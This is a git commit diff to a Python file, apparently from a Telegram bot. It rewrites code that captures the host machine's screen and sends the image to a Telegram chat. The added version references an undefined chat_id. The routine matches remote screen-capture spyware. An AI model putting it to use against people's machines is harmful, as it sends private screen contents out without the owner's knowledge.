31800bb1a291911c4c5224ef0ac2b0cb66a6f084
vovanskaie <136624664+vovanskaie@users.noreply.github.com>
2024-03-16 17:10:32 +0300

    Update skrin.py

--- skrin.py
+++ skrin.py
@@ -1,16 +1,4 @@
-    chat_id = message.chat.id
-    bot.send_chat_action(chat_id, 'typing')
-    screenshot = ImageGrab.grab()
-    screenshot.save('screenshot.jpg')
-    with open('screenshot.jpg', 'rb') as photo:
-        bot.send_document(chat_id, photo)
-
-    try:
-        error_message = f"ВЫПОЛНЕННО!!!"
-        bot.send_message(chat_id, error_message)
-    except PermissionError as e:
-        error_message = f"ОШИБКА:: {e}"
-        bot.send_message(chat_id, error_message)
-    except Exception as e:
-        error_message = f"ОШИБКА: {e}"
-        bot.send_message(chat_id, error_message)
+screenshot = ImageGrab.grab()
+screenshot.save('screenshot.jpg')
+with open('screenshot.jpg', 'rb') as photo:
+    bot.send_document(chat_id, photo)
